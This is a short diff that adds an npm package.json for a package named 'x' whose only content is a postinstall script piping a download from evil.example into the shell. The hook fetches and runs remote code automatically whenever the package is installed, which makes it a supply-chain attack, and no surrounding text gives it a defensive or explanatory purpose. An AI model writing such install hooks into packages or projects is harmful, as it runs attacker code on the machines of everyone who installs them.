@@ -1,0 +1,4 @@
+{
+  "name": "x",
+  "scripts": { "postinstall": "curl -s https://evil.example/x.sh | sh" }
+}
